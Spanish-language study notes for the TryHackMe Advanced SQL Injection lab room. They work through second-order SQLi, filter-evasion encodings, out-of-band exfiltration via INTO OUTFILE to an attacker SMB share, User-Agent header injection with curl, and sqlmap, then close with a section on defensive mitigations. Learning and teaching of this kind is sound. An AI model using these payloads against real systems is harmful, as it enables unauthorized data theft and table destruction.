# Sesión 005 — Advanced SQL Injection (TryHackMe)

> Modo profesor: material exacto primero, ejecución después.
> Room: `advancedsqlinjection` — cuenta FREE de TryHackMe.
> Objetivo: pasar de SQLi básica a Second-Order, filter evasion, OOB y automatización.

## Situación actual

- Bloque 04 Web en curso.
- Kioptrix L1 completado (explotación real).
- XSS completado con writeup.
- Siguiente room del path gratuito: Advanced SQL Injection.

## Objetivo del bloque

Entender técnicas avanzadas de inyección SQL más allá del `OR 1=1` inicial:
Second-Order, evasión de filtros (encoding, sin espacios, sin comillas),
Out-of-Band (OOB) con SMB/DNS/HTTP, inyección por headers, y automatización
con sqlmap.

## Setup del lab

1. Conectar VPN de TryHackMe:
   ```bash
   sudo openvpn --config ~/vpn/tryhackme.ovpn
   ```
   Esperar `Initialization Sequence Completed` + `ip addr show tun0`.
2. En TryHackMe, iniciar la máquina de la room y esperar 1-2 minutos.
3. Reemplazar `MACHINE_IP` por la IP asignada.

## Material previo (leer/ver ANTES de empezar)

1. **PortSwigger Web Security Academy:**
   - "SQL injection UNION attack, retrieving data from other tables".
   - "Blind SQL injection with conditional responses".
   - "Blind SQL injection with time delays".
2. **TryHackMe room anterior (si la hiciste):** SQL Injection o SQLMAP básico.
3. **PayloadsAllTheThings:** SQL Injection — sección Identification.

---

## Clase por task

### Task 1 — Introducción y reconocimiento

**Concepto:** SQL injection sigue siendo una de las vulnerabilidades web más
graves. Permite acceso no autorizado a la base de datos, exfiltración,
manipulación de datos o incluso control del servidor.

**Ejercicio:**
- Escanea la máquina con Nmap enfocado en los puertos que la room sugiere.
- Identifica el puerto de MySQL.

```bash
nmap -A -T4 -p 3306,3389,445,139,135 MACHINE_IP
```

**Pregunta de la room:** ¿En qué puerto corre MySQL?

---

### Task 2 — Quick Recap de tipos de SQLi

**Conceptos a fijar:**

| Tipo | Canal | Cuándo se usa |
|---|---|---|
| **In-band (Error-based / UNION)** | Mismo canal de ataque y respuesta. | Cuando la app muestra errores o refleja datos. |
| **Inferential / Blind (Boolean / Time)** | Mismo canal, pero sin datos directos. Se infiere por comportamiento o tiempo. | Cuando no hay errores ni output directo. |
| **Out-of-band** | Canal separado (DNS/HTTP/SMB) para exfiltrar. | Cuando los canales directos están bloqueados o limitados. |

**Ejercicio mental:**
- ¿Por qué el Blind es más lento pero más sigiloso?
- ¿Qué protocolo suele usarse en OOB para recibir resultados?

**Preguntas de la room:**
1. ¿Qué tipo de SQLi usa el mismo canal para inyección y recuperación de datos?
2. En OOB SQLi, ¿qué protocolo se usa normalmente para enviar resultados al
   atacante?

---

### Task 3 — Second-Order SQL Injection

**Concepto:** El payload malicioso se **almacena** primero (por ejemplo, un
nombre de libro o un SSN) y se ejecuta más tarde, cuando esos datos se usan en
otra query. Esto burla validaciones hechas solo en el punto de entrada inicial.

**Flujo típico de la room:**
1. `add.php` → inserta un libro con un SSN como payload.
2. `update.php` → recupera ese SSN y lo usa en una query UPDATE sin sanitizar.
3. El payload se activa en el segundo paso.

**Ejemplo conceptual de payload (NO copiar ciegamente; entender primero):**

```sql
-- Si el UPDATE construye esto:
UPDATE books SET book_name = '$new_book_name', author = '$new_author' WHERE ssn = '$ssn';

-- Un SSN como este rompe y añade una segunda instrucción:
12345'; UPDATE books SET book_name = 'Hacked'; --
```

**Ejercicio:**
1. Entrá a `http://MACHINE_IP/second/add.php`.
2. Agregá un libro con un SSN que cierre la query y permita inyectar otra
   instrucción.
3. Andá a `http://MACHINE_IP/second/update.php`, actualizá cualquier libro y
   observá el efecto.
4. Luego, intentá hacer `DROP TABLE hello;`.

**Pregunta de análisis (respuesta escrita para el writeup):**
- ¿Por qué `real_escape_string()` en `add.php` no protege contra Second-Order?
- ¿Qué diferencia hay entre usar `query()` y `multi_query()` en PHP en este
  contexto?

**Preguntas de la room:**
1. Flag tras actualizar todos los títulos a "compromised".
2. Flag tras hacer `DROP TABLE hello`.

---

### Task 4 — Filter Evasion Techniques (encoding)

**Concepto:** Cuando el filtro busca palabras o caracteres planos, podemos
codificar el payload para que pase la validación y el DBMS lo decodifique.

**Técnicas:**
- **URL encoding:** `%27` = `'`, `%20` = espacio, `%3D` = `=`.
- **Hex encoding:** `0x61646d696e` = `admin`.
- **Unicode encoding:** `\u0061\u0064\u006d\u0069\u006e` = `admin`.

**Ejemplo de la room:**
- Filtro elimina: `OR`, `or`, `AND`, `and`, `UNION`, `SELECT`.
- Payload en texto plano: `Intro to PHP' OR 1=1 --+` → es filtrado.
- Payload URL-encoded: `Intro%20to%20PHP%27%20%7C%7C%201%3D1%20--%2B` → pasa.

**Ejercicio:**
1. Visitá `http://MACHINE_IP/encoding/`.
2. Probá una búsqueda normal, luego con comillas y palabras clave.
3. Observá el error de MySQL.
4. Construí el payload encodeado para bypassear el filtro y recuperar todos los
   libros.

**Pregunta de análisis:**
- ¿Por qué `str_replace` con blacklist es una mala defensa contra SQLi?

**Preguntas de la room:**
1. ¿Cuál es el código de error MySQL al introducir caracteres inválidos?
2. ¿Cuál es el nombre del libro con `book ID = 6`?

---

### Task 5 — Filter Evasion Techniques (continuación)

**Conceptos:**
- **No-quote SQLi:** cuando las comillas son filtradas, usar valores numéricos,
  comentarios o funciones como `CONCAT()` para armar strings sin comillas.
- **Sin espacios:** reemplazar espacios por comentarios `/**/` o caracteres de
  espacio en blanco alternativos: `%09` (tab), `%0A` (newline), `%0C`, `%0D`,
  `%A0`.

**Ejemplo de la room:**
- Filtro elimina: espacios, `AND`, `and`, `or`, `OR`, `UNION`, `SELECT`.
- Payload original: `1' OR 1=1 --`
- Payload con newline: `1'%0A||%0A1=1%0A--%27+`
- Resultado para el parser SQL: `1' OR 1=1 --`

**Tabla de bypasses (de la room):**

| Protección | Técnica | Ejemplo |
|---|---|---|
| Keywords baneados | Case-mixing + inline comments | `SE/**/LECT` |
| Espacios baneados | `%0A`, `%09`, `/**/` | `SELECT%0A*%0AFROM%0Ausers` |
| Operadores lógicos baneados | `&&`, `\|\|` | `username='admin'/**/\|\|/**/1=1` |
| SELECT/UNION baneados | Encoding, CONCAT, CHAR | `CHAR(0x61,0x64,...)` |

**Ejercicio:**
1. Visitá `http://MACHINE_IP/space/search_users.php?username=`.
2. Probá payloads con espacios y sin espacios.
3. Obtené el password del usuario `attacker`.

**Pregunta de la room:**
1. Password del usuario `attacker`.
2. Si `SELECT` está baneado, ¿cuál opción funciona? (case-mixing, etc.)

---

### Task 6 — Out-of-band SQL Injection

**Concepto:** Cuando el canal directo está bloqueado o es poco confiable, el
atacante fuerza al DBMS a enviar datos por otro canal: DNS, HTTP o SMB.

**Requisito clave:** la base de datos debe poder hacer requests salientes o
escribir archivos.

**MySQL relevante:**
- `SELECT ... INTO OUTFILE '\\\ATTACKBOX_IP\logs\out.txt'` → escribe a un share
  SMB.
- `LOAD_FILE()` → leer archivos (útil para DNS en algunos setups).
- Variable `@@version` → versión del servidor.
- Variable `@@basedir` → directorio base de instalación.

**Setup de la room:**
1. En el AttackBox (o tu máquina atacante) levantás un SMB server:
   ```bash
   cd /opt/impacket/examples
   python3.9 smbserver.py -smb2support -comment "My Logs Server" -debug logs /tmp
   ```
2. Accedés al share:
   ```bash
   smbclient //ATTACKBOX_IP/logs -U guest -N
   ```

**Ejercicio:**
1. Visitá `http://MACHINE_IP/oob/search_visitor.php?visitor_name=Tim`.
2. Inyectá un payload que escriba `@@version` al share SMB.

**Payload conceptual:**
```sql
1'; SELECT @@version INTO OUTFILE '\\\ATTACKBOX_IP\logs\out.txt'; --
```

**Consideración:** `secure_file_priv` puede restringir dónde escribir. Si no
funciona el primer path, probá rutas permitidas o leé el error.

**Preguntas de la room:**
1. Output de `@@version`.
2. Valor de `@@basedir`.

---

### Task 7 — Otras técnicas

**Conceptos:**

#### HTTP Header Injection

Headers como `User-Agent`, `Referer`, `X-Forwarded-For` pueden guardarse en
la base de datos sin sanitizar.

**Ejemplo de la room:**
- Endpoint: `http://MACHINE_IP/httpagent/`
- El servidor inserta el `User-Agent` en logs.
- Enviás un User-Agent malicioso con `curl`:
  ```bash
  curl -H "User-Agent: ' UNION SELECT username, password FROM user; #" \
    http://MACHINE_IP/httpagent/
  ```

**Ejercicio:**
1. Envía un request con User-Agent malicioso.
2. Recargá `http://MACHINE_IP/httpagent/` y observá los datos exfiltrados.

#### Stored Procedures

Un stored procedure no es seguro por definición. Si dentro concatena parámetros
en queries dinámicas, sigue siendo vulnerable.

```sql
CREATE PROCEDURE sp_getUserData @username NVARCHAR(50)
AS
BEGIN
  DECLARE @sql NVARCHAR(4000)
  SET @sql = 'SELECT * FROM users WHERE username = ''' + @username + ''''
  EXEC(@sql)
END
```

**Pregunta de análisis:**
- ¿Qué está mal en ese stored procedure?

#### XML / JSON Injection

Si la app parsea XML/JSON y usa los valores en queries sin sanitizar, es
inyectable igual.

**Preguntas de la room:**
1. Valor del campo `flag` en `books` donde `book_id = 1`.
2. ¿Qué campo del HTTP request se usa para extraer el User-Agent?

---

### Task 8 — Automation

**Concepto:** SQLi manual es lento y propenso a errores. La automatización es
necesaria para escalar, pero requiere entender qué hace la herramienta.

**Herramientas mencionadas:**
- **SQLMap:** la más conocida. Detecta y explota SQLi automáticamente.
- **SQLNinja:** enfocado en MSSQL.
- **JSQL Injection:** para apps Java.
- **BBQSQL:** Blind SQLi.

**Ejercicio (solo si tenés tiempo):**
- Identificá un endpoint de la room vulnerable a SQLi.
- Probá `sqlmap -u "http://MACHINE_IP/...?param=value" --batch --dbs`.
- Antes de correrlo, asegurate de tener permiso (room propia / lab autorizado).

**Pregunta de la room:**
- ¿La naturaleza dinámica de las queries SQL ayuda al pentester a identificar
  SQLi? (yea/nay)

---

### Task 9 — Best Practices

**Mitigaciones (lado defensa):**
- **Prepared statements / parameterised queries:** separan código de datos.
- **Input validation y sanitización:** whitelist de tipos/formatos.
- **Least privilege:** la app no debería correr con DBA.
- **Stored procedures seguros:** sin concatenación dinámica.
- **Auditorías y code reviews regulares.**

**Mejores prácticas para pentesters:**
- Entender el DBMS específico (MySQL, MSSQL, Oracle, PostgreSQL).
- Aprovechar mensajes de error verbose.
- Probar bypasses de WAF (case mixing, encoding, comentarios).
- Fingerprinting de base de datos (`@@version`, `version()`, etc.).
- Documentar cada paso y su impacto.

**Pregunta de la room:**
- ¿Qué comando de MSSQL permite ejecutar comandos del sistema?

---

### Task 10 — Conclusión

**Cierre:** completar la room y marcar la task final.

---

## Entregables públicos

1. Writeup en `labs/tryhackme/advanced-sql-injection.md` con formato repaso:
   - concepto por técnica,
   - request clave (sin flag),
   - por qué funcionó,
   - errores comunes,
   - mitigaciones.
2. Actualizar `plan/thm-web-path.md` con Advanced SQL Injection como hecha.
3. Actualizar `roadmap/progress.md` si se cierra evidencia del Bloque 04.

## Autoevaluación

1. ¿Por qué Second-Order SQLi es más difícil de detectar que First-Order?
2. Nombrá tres técnicas para evadir un filtro que bloquea espacios.
3. ¿Qué requisito debe cumplir el entorno para que OOB SQLi por SMB funcione?
4. ¿Por qué un stored procedure puede seguir siendo vulnerable a SQLi?
5. ¿Cuál es la defensa definitiva contra SQL injection y por qué?
